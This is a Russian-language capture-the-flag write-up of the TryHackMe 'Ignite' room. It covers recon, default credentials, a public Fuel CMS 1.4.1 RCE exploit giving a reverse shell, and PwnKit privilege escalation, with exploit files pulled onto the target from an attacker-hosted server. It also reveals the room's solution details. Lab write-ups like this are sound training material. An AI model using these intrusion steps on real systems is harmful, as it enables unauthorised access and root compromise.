# TryHackMe — Ignite

**Платформа:** TryHackMe  
**Сложность:** Easy  
**Дата:** 2026-11-12  
**Векторы:** Fuel CMS 1.4.1 RCE (CVE-2018-16763) → PwnKit (CVE-2021-4034)

## TL;DR

- **Recon:** открыт только порт 80 (Apache 2.4.18) → Fuel CMS 1.4.1 → `robots.txt` указывает на `/fuel/`.
- **Foothold:** дефолтные креды `admin:admin` на `/home` → вход в админку `/fuel/` → публичный эксплойт Fuel CMS → RCE как `www-data`.
- **PrivEsc:** SUID `pkexec` (policykit-1 `0.105-14.1ubuntu0.4`) → CVE-2021-4034 (PwnKit) → root.

## 1. Recon

Сканирую все порты:

```bash
nmap -sC -sV -p- -T4 $TARGET_IP
```

Результат:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry /fuel/
|_http-title: Welcome to FUEL CMS
```

**Что вижу:** только веб на порту 80. Apache 2.4.18 + Fuel CMS. В `robots.txt` — директория `/fuel/`. Это подсказка: стоит проверить админку CMS и версию приложения.

## 2. Enumeration

Бручу директории:

```bash
gobuster dir -u http://$TARGET_IP/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -b 403,404 -t 50
```

Полезное из вывода:

```
assets              (Status: 301) [--> http://$TARGET_IP/assets/]
home                (Status: 200)
index.php           (Status: 200)
offline             (Status: 200)
robots.txt          (Status: 200)
```

**Почему:** `home` — вероятно, стартовая страница с контентом; `robots.txt` уже дал `/fuel/`. Проверяю `/home`.

## 3. Foothold

На странице `/home` в тексте — дефолтные креды `admin:admin`. Пробую их на `/fuel/` (из `robots.txt`) — попадаю в админ-панель Fuel CMS.

Попытка загрузить PHP-реверс-шелл через админку не сработала — валидация расширений. **Меняю вектор:** Fuel CMS 1.4.1 уязвим к pre-auth RCE — **CVE-2018-16763** (Exploit-DB 47138). Использую публичный PoC: [CovertOperation/Fuel-CMS-1.4.1](https://github.com/CovertOperation/Fuel-CMS-1.4.1).

Ставлю листенер:

```bash
nc -lvnp 4444
```

Запускаю эксплойт → получаю шелл `www-data`. Стабилизирую TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Читаю user-флаг: `/home/www-data/flag.txt`.

## 4. Privilege Escalation

Ищу SUID-бинарники:

```bash
find / -perm -u=s -type f 2>/dev/null
```

В списке — `pkexec`. Проверяю версию пакета:

```bash
dpkg -l | grep policykit
```

```
ii  policykit-1  0.105-14.1ubuntu0.4  amd64  framework for managing administrative policies
```

**Почему:** версия `0.105-14.1ubuntu0.4` ниже патча (`0.105-14.1ubuntu0.5+esm1`), значит уязвима к **PwnKit (CVE-2021-4034)**.

Беру эксплойт: [berdav/CVE-2021-4034](https://github.com/berdav/cve-2021-4034). Скачиваю **весь набор** файлов на атакующую машину:

```bash
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile
```

Поднимаю HTTP-сервер на атакующей:

```bash
python3 -m http.server 4001
```

На целевой машине скачиваю те же файлы:

```bash
wget http://$ATTACKER_IP:4001/pwnkit.c
wget http://$ATTACKER_IP:4001/cve-2021-4034.c
wget http://$ATTACKER_IP:4001/Makefile
```

Собираю и запускаю:

```bash
make
./cve-2021-4034
```

Получаю root-шелл. Читаю флаг:

```bash
cat /root/root.txt
```

## 5. Выводы и паттерны

- **Fuel CMS 1.4.1** → CVE-2018-16763 (RCE через параметр `filter`). Если вижу Fuel CMS — сразу проверяю версию и этот CVE.
- **Конфиги после шелла** — на Ignite задуманный путь к root был через `fuel/application/config/database.php` (пароль `mememe`, переиспользован для `root`). В следующий раз первым делом смотрю конфиги.
- **PwnKit** — `pkexec` + старая `policykit-1` → CVE-2021-4034. Собирать вручную через `Makefile`, а не полагаться на curl-скрипты (curl может отсутствовать).
- **Не сдаваться на одном векторе:** загрузка PHP через админку не сработала → переключился на публичный эксплойт → RCE.
